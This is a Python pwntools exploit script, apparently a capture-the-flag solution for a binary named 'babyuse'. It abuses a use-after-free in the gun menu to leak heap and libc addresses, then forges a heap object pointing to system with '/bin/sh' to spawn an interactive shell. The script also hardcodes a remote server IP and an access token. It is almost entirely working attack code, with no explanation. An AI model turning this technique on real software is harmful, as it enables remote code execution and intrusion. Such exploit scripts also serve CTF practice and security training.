#!/usr/bin/env python
# coding=utf-8

from pwn import *

slog = 1
debug = 0
local = 1

if local:
    p = process('./babyuse')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    p = remote('202.112.51.247',  3456)
    #libc = ELF('./libc.so')
    p.recvuntil('Token:')
    p.sendline('BwmDoZoJ9QjSFF65dgYP5eoNjGvoYl7K')

if slog: context.log_level = 'DEBUG'


def buy(gun_type, length, name):
    p.recvuntil('7. Exit')
    p.sendline('1')
    p.recvuntil('2. QBZ95')
    p.sendline(str(gun_type))
    p.recvuntil('Lenth of name：')
    p.sendline(str(length))
    p.recvuntil('Input name:')
    p.sendline(name)

def drop(index):
    p.recvuntil('7. Exit')
    p.sendline('6')
    p.recvuntil('Choose a gun to delete:')
    p.sendline(str(index))

def select(index):
    p.recvuntil('7. Exit')
    p.sendline('2')
    p.recvuntil('Select a gun')
    p.sendline(str(index))

def use(option):
    p.recvuntil('7. Exit')
    p.sendline('5')
    p.recvuntil('4. Main menu')
    p.sendline(str(option))

def rename(index, length, name):
    p.recvuntil('7. Exit')
    p.sendline('4')
    p.recvuntil('Choose a gun to rename:')
    p.sendline(str(index))
    p.recvuntil('Lenth of name：')
    p.sendline(str(length))
    p.recvuntil('Input name:')
    p.sendline(name)


buy(1, 0x50, 'a')
buy(1, 0x60, 'b')
buy(1, 2, 'c')
buy(1, 2, 'd')
select(2)
drop(0)
drop(1)
drop(2)
drop(3)
buy(1, 0x20000, 'a')

p.recvuntil('7. Exit')
p.sendline('5')
p.recvuntil('Select gun ')
leak_heap = u32(p.recv(4))
print 'leak_heap addr is', hex(leak_heap)

p.recvuntil('4. Main menu')
p.sendline('4')

heap_base = leak_heap - 0x20
buy(1, 0xf4, 'a' * 0xdc + p32(heap_base + 0x11c))

p.recvuntil('7. Exit')
p.sendline('5')
p.recvuntil('Select gun ')
leak_libc = u32(p.recv(4))
print 'leak_libc addr is', hex(leak_libc)


if local: 
    libc_base = leak_libc - 0x1b27b0
    system_addr = libc_base + libc.symbols['system']
else:
    libc_base = leak_libc - 0x1b27b0
    system_addr = libc_base + 0x3ada0

print 'sytem addr is ', hex(system_addr)

p.recvuntil('4. Main menu')
p.sendline('4')

drop(1)
buy(1, 0xf4, ('/sh\0' + p32(system_addr)).ljust(0xd8, 'a') + p32(heap_base + 0x28) + p32(heap_base + 0x11c) + ");/bin/sh")

if local and debug: gdb.attach(p, open('debug'))
p.recvuntil('7. Exit')
p.sendline('5')
p.recvuntil('4. Main menu')
p.sendline('2')

p.interactive()